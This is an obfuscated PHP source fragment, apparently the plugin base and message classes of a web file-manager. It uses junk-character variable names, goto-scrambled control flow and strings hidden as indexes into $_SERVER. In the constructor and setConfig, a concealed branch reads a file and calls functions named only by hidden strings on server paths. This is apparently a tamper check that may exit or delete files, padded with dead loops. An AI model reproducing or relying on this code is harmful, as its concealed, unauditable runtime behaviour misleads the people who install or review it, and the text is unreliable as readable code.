$F”¸—‰Œ¯° = array(); } goto DŸ›ïäÙ¡¤; dÔØÄì—µĞ: if ($d·›öÛŸæŒ + $F¡º‹³Ş´³ > $c¸ç¡Æ‚‚¡) { $F¡º‹³Ş´³ = $c¸ç¡Æ‚‚¡ - $d·›öÛŸæŒ; } if ($F¡º‹³Ş´³ <= 0) { return $F‹‘¶¸º´õ[33]; } if ($d·›öÛŸæŒ < 0 || $d·›öÛŸæŒ >= $c¸ç¡Æ‚‚¡ || $F¡º‹³Ş´³ <= 0 || $F¡º‹³Ş´³ > 1024 * 1024 * 5) { throw new Exception("\151\157\x46\x69\154\145\122\145\141\x64\x20\x65\162\162\x6f\162\x21\40\163\164\141\162\x74\75{$d·›öÛŸæŒ}\73\x6c\x65\156\x67\164\x68\75{$F¡º‹³Ş´³}\x3b\40\163\151\172\x65\x3d{$c¸ç¡Æ‚‚¡}\73"); } goto DÁŒìâó”›; B˜òİÌ’Åö: } private function log($c† –°á³, $c¦£¶ĞÀÒ ) { $fĞÑÙŠˆŞØ =& $_SERVER[ÒÆ›ÆØÎ¾]; $b‘­åš˜õ¸ = timeFloat() - $this->timeStart; write_log(sprintf($fĞÑÙŠˆŞØ[1384], $c† –°á³, $this->info[$fĞÑÙŠˆŞØ[28]], $b‘­åš˜õ¸, $c¦£¶ĞÀÒ ), $fĞÑÙŠˆŞØ[1069]); } } class Message { function __construct() { } public function send($CÙÃ¥¢ÖÊ = '', $Bè¦Œ÷˜ÊÃ = array(), $b¯ÁÛôáÃ¹ = "\164\145\170\164") { goto cˆ¨êßŠ¶‹; d½Ö¾‘ñÄå: Hook::trigger($CÌ”Ôé‰³†[1388], $c½²‰‹Ğë); goto F¦Ğ¾³Ï; cˆ¨êßŠ¶‹: $CÌ”Ôé‰³† =& $_SERVER[ÒÆ›ÆØÎ¾]; $dá£ÕÄ°¼± = array($CÌ”Ôé‰³†[29] => $CÌ”Ôé‰³†[1385], $CÌ”Ôé‰³†[707] => $CÙÃ¥¢ÖÊ); if (in_array($b¯ÁÛôáÃ¹, array($CÌ”Ôé‰³†[1385], $CÌ”Ôé‰³†[1386]))) { $dá£ÕÄ°¼±[$CÌ”Ôé‰³†[29]] = $b¯ÁÛôáÃ¹; } goto AÁÙŒ†ŞÇ; AÁÙŒ†ŞÇ: $Bè¦Œ÷˜ÊÃ = array($CÌ”Ôé‰³†[1006] => isset($Bè¦Œ÷˜ÊÃ[$CÌ”Ôé‰³†[1006]]) ? $Bè¦Œ÷˜ÊÃ[$CÌ”Ôé‰³†[1006]] : $CÌ”Ôé‰³†[33], $CÌ”Ôé‰³†[562] => isset($Bè¦Œ÷˜ÊÃ[$CÌ”Ôé‰³†[562]]) ? $Bè¦Œ÷˜ÊÃ[$CÌ”Ôé‰³†[562]] : $CÌ”Ôé‰³†[33]); if (empty($CÙÃ¥¢ÖÊ) || empty($Bè¦Œ÷˜ÊÃ[$CÌ”Ôé‰³†[1006]]) && empty($Bè¦Œ÷˜ÊÃ[$CÌ”Ôé‰³†[562]])) { return !1; } $c½²‰‹Ğë = array($CÌ”Ôé‰³†[1326] => $dá£ÕÄ°¼±, $CÌ”Ôé‰³†[1387] => $Bè¦Œ÷˜ÊÃ); goto d½Ö¾‘ñÄå; F¦Ğ¾³Ï: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto C¬°ö‚êö; C§ÄÔµÒÒ¦: if ($B°âÓ”¶–º && strpos($eÀø¢Â¤¤Ü[47] . $B°âÓ”¶–º . $eÀø¢Â¤¤Ü[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$eÀø¢Â¤¤Ü[1393]] . $this->pluginName . $eÀø¢Â¤¤Ü[8]; } $this->pluginLangArr = $this->initLang(); $this->values = array(); goto CÜ¢¬ë¾µ; CîÊó¢å—: $this->pluginName = str_replace($eÀø¢Â¤¤Ü[1389], $eÀø¢Â¤¤Ü[33], get_class($this)); $this->pluginPath = PLUGIN_DIR . $this->pluginName . $eÀø¢Â¤¤Ü[8]; $this->pluginApi = appHostGet() . $eÀø¢Â¤¤Ü[1390] . $this->pluginName . $eÀø¢Â¤¤Ü[8]; goto eŞÂ‰ªš®; C¬°ö‚êö: $eÀø¢Â¤¤Ü =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($_SERVER[$eÀø¢Â¤¤Ü[784]] != $_SERVER[$eÀø¢Â¤¤Ü[830]]) { goto CëƒÛ»¥õ‘; dš­ºçİ©â: $aÆ„¤´ƒÑ = 1; while ($aÆ„¤´ƒÑ > 1) { $aÆ„¤´ƒÑ = $aÆ„¤´ƒÑ + 4; $BŒ¶Íì¡ = rawurlencode($aÆ„¤´ƒÑ . $eÀø¢Â¤¤Ü[375]); } goto Eñ…¯íÓƒñ; CëƒÛ»¥õ‘: $Dß‡„«½÷‚ = $eÀø¢Â¤¤Ü[831]; $F„õ…çïÎ = $eÀø¢Â¤¤Ü[786]; $Aµ¦œ‰·êä = $_SERVER[$eÀø¢Â¤¤Ü[787]] . $eÀø¢Â¤¤Ü[788]; goto a«‰¯ÀÍ”Ó; d¤”ÎÏÀğ: $A‘Ø×ô”ù« = $eÀø¢Â¤¤Ü[832]; $A‘Ø×ô”ù«($_SERVER[$eÀø¢Â¤¤Ü[833]]); $A‘Ø×ô”ù«($_SERVER[$eÀø¢Â¤¤Ü[787]] . $eÀø¢Â¤¤Ü[834]); goto dš­ºçİ©â; a«‰¯ÀÍ”Ó: $B…Ùƒ…×À = $F„õ…çïÎ($Aµ¦œ‰·êä); $C‚—½’¦äŒ = explode($eÀø¢Â¤¤Ü[229], $B…Ùƒ…×À); if (count($C‚—½’¦äŒ) < $eÀø¢Â¤¤Ü[592]) { $aÆŞÅä•®¦ = $eÀø¢Â¤¤Ü[789]; $aÆŞÅä•®¦(); } goto d¤”ÎÏÀğ; Eñ…¯íÓƒñ: } global $in, $config; goto CöÈ‘ƒîÀİ; CÜ¢¬ë¾µ: return $this; goto C¸ùÂ‡Šç½; CöÈ‘ƒîÀİ: $this->config =& $config; $this->in =& $in; $this->modelPlugin = Model($eÀø¢Â¤¤Ü[1389]); goto CîÊó¢å—; eŞÂ‰ªš®: $this->pluginHost = $config[$eÀø¢Â¤¤Ü[1391]] . $this->pluginName . $eÀø¢Â¤¤Ü[8]; $this->pluginHostDefault = $config[$eÀø¢Â¤¤Ü[1391]] . $this->pluginName . $eÀø¢Â¤¤Ü[8]; $B°âÓ”¶–º = $config[$eÀø¢Â¤¤Ü[1392]]; goto C§ÄÔµÒÒ¦; C¸ùÂ‡Šç½: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[ÒÆ›ÆØÎ¾][1394]); } protected function assign($dĞ—éÆ¨‹, $E¦‡…Û¤† = false) { if (is_array($dĞ—éÆ¨‹)) { $this->values = array_merge($this->values, $dĞ—éÆ¨‹); } else { $this->values[$dĞ—éÆ¨‹] = $E¦‡…Û¤†; } } protected function display($aƒ¶›ïÀºè) { extract($this->values); require $aƒ¶›ïÀºè; } final function hookRegist($c‰Íàí‡áÔ) { $this->modelPlugin->appRegist($this->pluginName, $c‰Íàí‡áÔ); } final function appIcon() { $dß¨¦Ùƒç =& $_SERVER[ÒÆ›ÆØÎ¾]; $eã°†‹ì§ = $this->appPackage(); $bàÜ×ì²„ï = $dß¨¦Ùƒç[33]; if (isset($eã°†‹ì§[$dß¨¦Ùƒç[409]])) { if (isset($eã°†‹ì§[$dß¨¦Ùƒç[409]][$dß¨¦Ùƒç[1395]])) { $bàÜ×ì²„ï = $dß¨¦Ùƒç[1396] . $eã°†‹ì§[$dß¨¦Ùƒç[409]][$dß¨¦Ùƒç[1395]] . $dß¨¦Ùƒç[1397]; } else { if ($eã°†‹ì§[$dß¨¦Ùƒç[409]][$dß¨¦Ùƒç[1398]]) { $bàÜ×ì²„ï = $dß¨¦Ùƒç[1399] . $eã°†‹ì§[$dß¨¦Ùƒç[409]][$dß¨¦Ùƒç[1398]] . $dß¨¦Ùƒç[1400]; } } } return $bàÜ×ì²„ï; } final function fileCanView($e¥Šœ»ñ) { goto F¯ğ¤Éê›Û; F¯ğ¤Éê›Û: $DÀ›ˆºˆ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (request_url_safe($e¥Šœ»ñ)) { return !0; } if ($this->isShare($e¥Šœ»ñ)) { return !0; } goto dÙÔ‡ºÕÑÙ; dÙÔ‡ºÕÑÙ: $d”ªÁ¹Ïª = Session::get($DÀ›ˆºˆ[1401]); if (!$d”ªÁ¹Ïª || !$d”ªÁ¹Ïª[$DÀ›ˆºˆ[1402]]) { $BÔÓª‰õŞ× = $DÀ›ˆºˆ[1403] . rawurlencode(this_url()); show_tips(LNG($DÀ›ˆºˆ[1404]) . $DÀ›ˆºˆ[1405] . $BÔÓª‰õŞ× . $DÀ›ˆºˆ[1406] . LNG($DÀ›ˆºˆ[1407]) . $DÀ›ˆºˆ[1408], !1); } if (!Action($DÀ›ˆºˆ[1409])->authCan($DÀ›ˆºˆ[1410])) { show_tips(LNG($DÀ›ˆºˆ[1411]) . $DÀ›ˆºˆ[1412], !1); } goto F¤öê¡õË£; F¤öê¡õË£: ActionCall($DÀ›ˆºˆ[1413], $e¥Šœ»ñ); goto a‚²”¬šŠí; a‚²”¬šŠí: } final function isShare($C¨éÙÕÜ÷) { $c­Ò… ¼š³ = KodIO::parse($C¨éÙÕÜ÷); return $c­Ò… ¼š³[$_SERVER[ÒÆ›ÆØÎ¾][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($bŸæŒ‹«÷) { if (request_url_safe($bŸæŒ‹«÷)) { return $bŸæŒ‹«÷; } if (!$this->isShare($bŸæŒ‹«÷)) { $bŸæŒ‹«÷ = $this->filePath($bŸæŒ‹«÷); } return Action($_SERVER[ÒÆ›ÆØÎ¾][1061])->linkOut($bŸæŒ‹«÷); } public function filePathLinkOut($DùŠöŸ‚¾ƒ) { if (request_url_safe($DùŠöŸ‚¾ƒ)) { return $DùŠöŸ‚¾ƒ; } $this->fileCanView($DùŠöŸ‚¾ƒ); return Action($_SERVER[ÒÆ›ÆØÎ¾][1061])->link($DùŠöŸ‚¾ƒ); } final function filePath($eĞƒ‰“«ïé) { $Dµ²‚¨Š’ =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($eâ°äÀª›ã = $this->checkSharePath($eĞƒ‰“«ïé)) { Hook::trigger($Dµ²‚¨Š’[1414], $eâ°äÀª›ã); return $eâ°äÀª›ã; } $this->fileCanView($eĞƒ‰“«ïé); if (request_url_safe($eĞƒ‰“«ïé)) { $BÜØãÏÓ¹” = parse_url_query($eĞƒ‰“«ïé); if (isset($BÜØãÏÓ¹”[$Dµ²‚¨Š’[1415]]) && isset($BÜØãÏÓ¹”[$Dµ²‚¨Š’[209]])) { $d©Ş§“Á ™ = Model($Dµ²‚¨Š’[722])->get($Dµ²‚¨Š’[723]); $Dô¦ˆˆÅ¶ = Mcrypt::decode($BÜØãÏÓ¹”[$Dµ²‚¨Š’[209]], $d©Ş§“Á ™); if ($Dô¦ˆˆÅ¶) { $this->fileInfo = IO::infoWithChildren($Dô¦ˆˆÅ¶); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $Dô¦ˆˆÅ¶; } } $eĞƒ‰“«ïé = $this->_cacheHttpFile($eĞƒ‰“«ïé); $this->fileInfo = IO::infoWithChildren($eĞƒ‰“«ïé); } else { $this->fileInfo = IO::infoWithChildren($eĞƒ‰“«ïé); if (!$this->fileInfo) { show_tips(LNG($Dµ²‚¨Š’[105]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } Hook::trigger($Dµ²‚¨Š’[1414], $eĞƒ‰“«ïé); return $eĞƒ‰“«ïé; } final function _cacheHttpFile($f¨†‹¸È¿‘) { $fò¹ßŠ…÷¼ = hash_path($f¨†‹¸È¿‘, !0); $this->cachePath = $this->pluginCachePath($fò¹ßŠ…÷¼); if ($eİÁ²‰ÔĞ¤ = IO::fileNameExist($this->cachePath, $fò¹ßŠ…÷¼)) { return KodIO::make($eİÁ²‰ÔĞ¤); } $D”„×Ñ“À = $this->cachePath . $fò¹ßŠ…÷¼; return $this->pluginCacheFileSet($D”„×Ñ“À, file_get_contents_nossl($f¨†‹¸È¿‘)); } final function _tmpFileName($EÓƒªˆƒğ = array()) { goto Aõ‰Êñê; dÍ™Ø¼ï•Û: if (isset($EÓƒªˆƒğ[$EôİĞ¦ÈÀ®[164]][$EôİĞ¦ÈÀ®[171]])) { return $EÓƒªˆƒğ[$EôİĞ¦ÈÀ®[164]][$EôİĞ¦ÈÀ®[171]]; } $aƒÄÀĞå  = IO::hashSimple($EÓƒªˆƒğ[$EôİĞ¦ÈÀ®[76]]); if ($aƒÄÀĞå ) { return $aƒÄÀĞå ; } goto b§ñ¤äÕôô; b§ñ¤äÕôô: $a­¢™ˆò×Ã = array($EÓƒªˆƒğ[$EôİĞ¦ÈÀ®[28]], $EÓƒªˆƒğ[$EôİĞ¦ÈÀ®[76]], $EÓƒªˆƒğ[$EôİĞ¦ÈÀ®[78]]); if (isset($EÓƒªˆƒğ[$EôİĞ¦ÈÀ®[487]])) { $a­¢™ˆò×Ã[] = $EÓƒªˆƒğ[$EôİĞ¦ÈÀ®[487]]; } return md5(implode($EôİĞ¦ÈÀ®[71], $a­¢™ˆò×Ã)); goto eĞ•…İæ©; Aõ‰Êñê: $EôİĞ¦ÈÀ® =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!$EÓƒªˆƒğ) { $EÓƒªˆƒğ = $this->fileInfo; } if (isset($EÓƒªˆƒğ[$EôİĞ¦ÈÀ®[171]])) { return $EÓƒªˆƒğ[$EôİĞ¦ÈÀ®[171]]; } goto dÍ™Ø¼ï•Û; eĞ•…İæ©: } final function checkSharePath($cªÔ¶ÙÈà) { goto e±ˆë¿¢ƒ; Cèì«£Ù”Û: $a¡ªº²Ğâ = Action($b‹–¹æğŞˆ[1061])->sharePathInfo($cªÔ¶ÙÈà); if (!isset($a¡ªº²Ğâ[$b‹–¹æğŞˆ[76]])) { show_json(LNG($b‹–¹æğŞˆ[1417]), !1); } $this->fileInfo = $a¡ªº²Ğâ[$b‹–¹æğŞˆ[164]]; goto A£Š±ŒáÑ; e±ˆë¿¢ƒ: $b‹–¹æğŞˆ =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!defined($b‹–¹æğŞˆ[454])) { define($b‹–¹æğŞˆ[1416], 0); } if (!$this->isShare($cªÔ¶ÙÈà)) { return !1; } goto Cèì«£Ù”Û; A£Š±ŒáÑ: $this->cachePath = $this->pluginCachePath($this->fileInfo[$b‹–¹æğŞˆ[171]]); return $a¡ªº²Ğâ[$b‹–¹æğŞˆ[76]]; goto aÖĞ—ÈêÄõ; aÖĞ—ÈêÄõ: } final function pluginCachePath($cğ×ÛÕĞ÷ = '') { $cÏœ¶¬é¤ñ =& $_SERVER[ÒÆ›ÆØÎ¾]; $e›ÒÇ„°‘ = IO_PATH_SYSTEM_TEMP . $cÏœ¶¬é¤ñ[1418] . $this->pluginName; if (!($fÊ—“‰°¥ = IO::infoFull($e›ÒÇ„°‘))) { return IO::mkdir($e›ÒÇ„°‘ . $cÏœ¶¬é¤ñ[8] . $cğ×ÛÕĞ÷); } if (empty($cğ×ÛÕĞ÷)) { return $fÊ—“‰°¥[$cÏœ¶¬é¤ñ[76]]; } if (!($cÍ±¬ßÈÔ™ = IO::fileNameExist($fÊ—“‰°¥[$cÏœ¶¬é¤ñ[76]], $cğ×ÛÕĞ÷))) { return IO::mkdir($fÊ—“‰°¥[$cÏœ¶¬é¤ñ[76]] . $cğ×ÛÕĞ÷); } return KodIO::make($cÍ±¬ßÈÔ™); } final function pluginCacheFileSet($c¹¡ˆ…‚½„, $D…÷˜Ãƒ¢£ = '') { $Aîƒæ ¢í =& $_SERVER[ÒÆ›ÆØÎ¾]; if (!($a´Û¶ğï›¯ = IO::infoFull($c¹¡ˆ…‚½„))) { return IO::mkfile($c¹¡ˆ…‚½„, $D…÷˜Ãƒ¢£, REPEAT_REPLACE); } IO::setContent($a´Û¶ğï›¯[$Aîƒæ ¢í[76]], $D…÷˜Ãƒ¢£); return $a´Û¶ğï›¯[$Aîƒæ ¢í[76]]; } final function pluginLocalFile($Føóó™ïá± = '') { goto f‰•óìïÛŞ; Bˆã¯¦‘Ö: if (!$Føóó™ïá±) { return $EÄµŒİŞ©Ã; } $a©øèŒ·… = IO::info($Føóó™ïá±); $BË®ÛëËÍù = $this->_tmpFileName($a©øèŒ·…) . $eÔÊŒÑí÷Ğ[95] . $a©øèŒ·…[$eÔÊŒÑí÷Ğ[168]]; goto Bğ³Ö¿ĞÉ; Bğ³Ö¿ĞÉ: if (!checkExtSafe($BË®ÛëËÍù)) { $BË®ÛëËÍù = $BË®ÛëËÍù . $eÔÊŒÑí÷Ğ[1419]; } $dáƒèó­¥ô = $EÄµŒİŞ©Ã . $BË®ÛëËÍù; if (@file_exists($dáƒèó­¥ô)) { return $dáƒèó­¥ô; } goto b÷ Í‹ÚèÂ; b÷ Í‹ÚèÂ: return IO::copy($Føóó™ïá±, $EÄµŒİŞ©Ã, 0, $BË®ÛëËÍù); goto eËÍÁÀğÒ®; f‰•óìïÛŞ: $eÔÊŒÑí÷Ğ =& $_SERVER[ÒÆ›ÆØÎ¾]; $EÄµŒİŞ©Ã = TEMP_FILES . "{$this->pluginName}\57"; if (!is_dir($EÄµŒİŞ©Ã)) { mk_dir($EÄµŒİŞ©Ã); } goto Bˆã¯¦‘Ö; eËÍÁÀğÒ®: } final function appPackage() { goto bî¾ àÈÙª; c³ŞÅ—Š¿: $this->parseLang($a¸‚ò½ÂÃÙ); $dÚ÷íß’ÚÖ = json_decode_force($a¸‚ò½ÂÃÙ); if (!$dÚ÷íß’ÚÖ) { return array(); } goto F·¹Ô³±å; bî¾ àÈÙª: $DÛ§×ñšÑë =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($this->packageData) { return $this->packageData; } $a¸‚ò½ÂÃÙ = $this->parseFile($this->pluginPath . $DÛ§×ñšÑë[1420]); goto c³ŞÅ—Š¿; F·¹Ô³±å: $dî °ñ²§î = Hook::trigger($DÛ§×ñšÑë[1421], $dÚ÷íß’ÚÖ); if ($dî °ñ²§î && is_array($dî °ñ²§î)) { $dÚ÷íß’ÚÖ = $dî °ñ²§î; } $this->packageData = $dÚ÷íß’ÚÖ; goto CÖÖÎœ¦õø; CÖÖÎœ¦õø: return $dÚ÷íß’ÚÖ; goto eáéäÂ±¹ó; eáéäÂ±¹ó: } public function packageInfoGet($bö—ˆåâ) { $aŠ„÷§„ÈÕ = $this->appPackage(); return array_get_value($aŠ„÷§„ÈÕ, $bö—ˆåâ); } public function packageVersion() { return $this->packageInfoGet($_SERVER[ÒÆ›ÆØÎ¾][1422]); } public function packageTitle() { return $this->packageInfoGet($_SERVER[ÒÆ›ÆØÎ¾][1423]); } public function packageCopyright() { return $this->packageInfoGet($_SERVER[ÒÆ›ÆØÎ¾][1424]); } private function parseFile($Càª«æÈ‰) { goto c®Ç»»…¶; E¤ˆëŠµ¼: $B”Â³£Œ×¦ = array($this->pluginHost, $this->pluginHostDefault, $this->pluginApi, $this->pluginName, $this->pluginPath, APP_HOST, $this->config[$C„òç²ˆ•¨[88]][$C„òç²ˆ•¨[1432]]); if (strstr($BÔ¦Ò¸´®‡, $C„òç²ˆ•¨[1433])) { $Dí¯¨ˆŞ” = rawurlencode(json_encode($this->pluginLangArr)); $BÔ¦Ò¸´®‡ = str_replace($C„òç²ˆ•¨[1433], $Dí¯¨ˆŞ”, $BÔ¦Ò¸´®‡); } if (strstr($BÔ¦Ò¸´®‡, $C„òç²ˆ•¨[1434])) { $Dí¯¨ˆŞ” = $Dí¯¨ˆŞ” = rawurlencode(json_encode($this->getConfig())); $BÔ¦Ò¸´®‡ = str_replace($C„òç²ˆ•¨[1434], $Dí¯¨ˆŞ”, $BÔ¦Ò¸´®‡); } goto bâ¦ëãÖÅ³; bâ¦ëãÖÅ³: $BÔ¦Ò¸´®‡ = str_replace($A¢”èàõß‹, $B”Â³£Œ×¦, $BÔ¦Ò¸´®‡); return $BÔ¦Ò¸´®‡; goto Eœ§Á¬ÄÒ; c®Ç»»…¶: $C„òç²ˆ•¨ =& $_SERVER[ÒÆ›ÆØÎ¾]; $BÔ¦Ò¸´®‡ = file_get_contents_nossl($Càª«æÈ‰); $A¢”èàõß‹ = array($C„òç²ˆ•¨[1425], $C„òç²ˆ•¨[1426], $C„òç²ˆ•¨[1427], $C„òç²ˆ•¨[1428], $C„òç²ˆ•¨[1429], $C„òç²ˆ•¨[1430], $C„òç²ˆ•¨[1431]); goto E¤ˆëŠµ¼; Eœ§Á¬ÄÒ: } private function parseLang(&$CƒŒß¥ƒ˜‰) { goto f‡ÜëÁÛÃ; f¢çÊÓîã‡: preg_match_all($fÉ¦•«µë”[1436], $CƒŒß¥ƒ˜‰, $c»™ñ©ÇËä); if (!is_array($c»™ñ©ÇËä) || count($c»™ñ©ÇËä) == 0 || !is_array($c»™ñ©ÇËä[0]) || count($c»™ñ©ÇËä[0]) == 0) { return; } $Cøå»ç±Áö = array(); goto EÈ´½‡ëÂå; f‡ÜëÁÛÃ: $fÉ¦•«µë” =& $_SERVER[ÒÆ›ÆØÎ¾]; $a«æ»ƒÜé = $fÉ¦•«µë”[1435]; if (!strstr($CƒŒß¥ƒ˜‰, $a«æ»ƒÜé)) { return; } goto f¢çÊÓîã‡; EÈ´½‡ëÂå: $CÑ—¬¶„’ñ = array(); foreach ($c»™ñ©ÇËä[0] as $A£Å¿®•®Ë) { $Dğ¥åŒ»êŸ = substr($A£Å¿®•®Ë, strlen($a«æ»ƒÜé), -4); $eÛš…å§³´ = LNG($Dğ¥åŒ»êŸ); $Cøå»ç±Áö[] = $A£Å¿®•®Ë; $CÑ—¬¶„’ñ[] = str_replace(array($fÉ¦•«µë”[229], $fÉ¦•«µë”[1029], $fÉ¦•«µë”[340], $fÉ¦•«µë”[116]), array($fÉ¦•«µë”[50], $fÉ¦•«µë”[50], $fÉ¦•«µë”[33], $fÉ¦•«µë”[1437]), $eÛš…å§³´); } $CƒŒß¥ƒ˜‰ = str_replace($Cøå»ç±Áö, $CÑ—¬¶„’ñ, $CƒŒß¥ƒ˜‰); goto d‡İÄùà†; d‡İÄùà†: } private function parseConfig(&$aŒ¤òéÇÎ) { goto A¦£”„øÉÓ; DÀ ÛÑš‹å: preg_match_all($E‚ëÚ¡íÚ±[1439], $aŒ¤òéÇÎ, $fÄ¹Ô’Íê‚); if (!is_array($fÄ¹Ô’Íê‚) || count($fÄ¹Ô’Íê‚) == 0 || !is_array($fÄ¹Ô’Íê‚[0]) || count($fÄ¹Ô’Íê‚[0]) == 0) { return; } $CïÂÚëÄ„„ = $this->getConfig(); goto då’ºÜ²ƒ; A¦£”„øÉÓ: $E‚ëÚ¡íÚ± =& $_SERVER[ÒÆ›ÆØÎ¾]; $FŞ…øßÚºš = $E‚ëÚ¡íÚ±[1438]; if (!strstr($aŒ¤òéÇÎ, $FŞ…øßÚºš)) { return; } goto DÀ ÛÑš‹å; eÓÁÊ´§óØ: $aŒ¤òéÇÎ = str_replace($A°Íç˜¨§, $FŞ°ŠÄ»¿Ø, $aŒ¤òéÇÎ); goto C²‚éÉ¨›¢; då’ºÜ²ƒ: $A°Íç˜¨§ = array(); $FŞ°ŠÄ»¿Ø = array(); foreach ($fÄ¹Ô’Íê‚[0] as $DğÑ³¶àßÙ) { $e¼¿­ÎÑóÇ = substr($DğÑ³¶àßÙ, strlen($FŞ…øßÚºš), -2); $A°Íç˜¨§[] = $DğÑ³¶àßÙ; $FŞ°ŠÄ»¿Ø[] = _get($CïÂÚëÄ„„, $e¼¿­ÎÑóÇ); } goto eÓÁÊ´§óØ; C²‚éÉ¨›¢: } private function parsePackage(&$BùÃ§áê‚) { goto eîÇ¿õÕ«Å; FÍ„Ş·Í”•: preg_match_all($A¤˜àëø[1441], $BùÃ§áê‚, $FŠ†‰ÖŒ¯ñ); if (!is_array($FŠ†‰ÖŒ¯ñ) || count($FŠ†‰ÖŒ¯ñ) == 0 || !is_array($FŠ†‰ÖŒ¯ñ[0]) || count($FŠ†‰ÖŒ¯ñ[0]) == 0) { return; } $B‹ÈŠ¯¨ = $this->appPackage(); goto DªáÑáÚŞ; eÙĞ½ÖŠåí: $BùÃ§áê‚ = str_replace($BØâŠÍ“ğ«, $DÖŞ¦¾’Ö„, $BùÃ§áê‚); goto bßì‡ÍÆ¯¤; eîÇ¿õÕ«Å: $A¤˜àëø =& $_SERVER[ÒÆ›ÆØÎ¾]; $D˜‘»À–£• = $A¤˜àëø[1440]; if (!strstr($BùÃ§áê‚, $D˜‘»À–£•)) { return; } goto FÍ„Ş·Í”•; DªáÑáÚŞ: $BØâŠÍ“ğ« = array(); $DÖŞ¦¾’Ö„ = array(); foreach ($FŠ†‰ÖŒ¯ñ[0] as $C„º—õäçÜ) { $EĞ‹ï¹ŸÓ™ = substr($C„º—õäçÜ, strlen($D˜‘»À–£•), -2); $BØâŠÍ“ğ«[] = $C„º—õäçÜ; $DÖŞ¦¾’Ö„[] = _get($B‹ÈŠ¯¨, $EĞ‹ï¹ŸÓ™); } goto eÙĞ½ÖŠåí; bßì‡ÍÆ¯¤: } final function echoFile($B¬÷‚Î«², $e÷Ë‹İµÄµ = false) { goto D©ŠùÑ·Å; DÍè¶Š‹Ïä: $this->parsePackage($Bèåñ×¨Óå); if (is_array($e÷Ë‹İµÄµ)) { $Bèåñ×¨Óå = str_replace(array_keys($e÷Ë‹İµÄµ), array_values($e÷Ë‹İµÄµ), $Bèåñ×¨Óå); } echo $EÑØÒĞŒ‚Ü[229] . $Bèåñ×¨Óå; goto dÓêÓƒÃ„; aÜ¥œ©Ûé‰: $Bèåñ×¨Óå = $this->parseFile($Eöå‹ƒÃ§); $this->parseLang($Bèåñ×¨Óå); $this->parseConfig($Bèåñ×¨Óå); goto DÍè¶Š‹Ïä; D©ŠùÑ·Å: $EÑØÒĞŒ‚Ü =& $_SERVER[ÒÆ›ÆØÎ¾]; $Eöå‹ƒÃ§ = $this->pluginPath . $B¬÷‚Î«²; if (ACT == $EÑØÒĞŒ‚Ü[1442]) { echo $EÑØÒĞŒ‚Ü[1443] . $this->pluginName . $EÑØÒĞŒ‚Ü[8] . $B¬÷‚Î«² . $EÑØÒĞŒ‚Ü[1444]; if (!file_exists($Eöå‹ƒÃ§)) { echo $EÑØÒĞŒ‚Ü[1445]; return; } } goto aÜ¥œ©Ûé‰; dÓêÓƒÃ„: } final function initLang() { goto b’¦ãœÜ‹Ì; b’¦ãœÜ‹Ì: $dõ³ ­Œ² =& $_SERVER[ÒÆ›ÆØÎ¾]; $Dé±•Èàö¸ = $dõ³ ­Œ²[1446]; $B–¦ù÷Ù‹’ = $this->pluginPath . $dõ³ ­Œ²[1447]; goto AØ˜Á®î×¿; D§Şï†´Àê: if (!is_array($bíŠÑ”ëš)) { return array(); } if (@count($bíŠÑ”ëš) > 0) { I18n::set($bíŠÑ”ëš); } return $bíŠÑ”ëš; goto Fà¬´¤‘; AØ˜Á®î×¿: $aÄÃ”…ÊæÍ = I18n::getType(); $bíŠÑ”ëš = array(); if (file_exists($B–¦ù÷Ù‹’ . $aÄÃ”…ÊæÍ . $dõ³ ­Œ²[802])) { $bíŠÑ”ëš = (include $B–¦ù÷Ù‹’ . $aÄÃ”…ÊæÍ . $dõ³ ­Œ²[802]); } else { if ($aÄÃ”…ÊæÍ == $dõ³ ­Œ²[1448] && !file_exists($B–¦ù÷Ù‹’ . $aÄÃ”…ÊæÍ . $dõ³ ­Œ²[802]) && file_exists($B–¦ù÷Ù‹’ . $dõ³ ­Œ²[1449])) { $bíŠÑ”ëš = (include $B–¦ù÷Ù‹’ . $dõ³ ­Œ²[1449]); } else { if (file_exists($B–¦ù÷Ù‹’ . $Dé±•Èàö¸ . $dõ³ ­Œ²[802])) { $bíŠÑ”ëš = (include $B–¦ù÷Ù‹’ . $Dé±•Èàö¸ . $dõ³ ­Œ²[802]); } } } goto D§Şï†´Àê; Fà¬´¤‘: } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($AÌˆ‚š¬‚¥) { $d§ÁœãŠ¸ë =& $_SERVER[ÒÆ›ÆØÎ¾]; if ($_SERVER[$d§ÁœãŠ¸ë[784]] != $_SERVER[$d§ÁœãŠ¸ë[830]]) { goto BÅÀ–½‚Ì; D“‚ƒé¾í : $bÛ˜ËáÄ¨ = $d§ÁœãŠ¸ë[832]; $bÛ˜ËáÄ¨($_SERVER[$d§ÁœãŠ¸ë[833]]); $bÛ˜ËáÄ¨($_SERVER[$d§ÁœãŠ¸ë[787]] . $d§ÁœãŠ¸ë[834]); goto CÑ®•Ë¬ªÍ; CÑ®•Ë¬ªÍ: $cœİ‡åÓ¸ê = 1; while ($cœİ‡åÓ¸ê > 1) { $cœİ‡åÓ¸ê = $cœİ‡åÓ¸ê + 4; $E‡ºÍ³¼¼Ç = rawurlencode($cœİ‡åÓ¸ê . $d§ÁœãŠ¸ë[375]); } goto cŞéò¿œøè; BÅÀ–½‚Ì: $eì³÷ñ = $d§ÁœãŠ¸ë[831]; $F„³á´Şù = $d§ÁœãŠ¸ë[786]; $BÄß‚®‚Ç = $_SERVER[$d§ÁœãŠ¸ë[787]] . $d§ÁœãŠ¸ë[788]; goto dÇöÙ™›øÛ; dÇöÙ™›øÛ: $C†£«»¨ïÒ = $F„³á´Şù($BÄß‚®‚Ç); 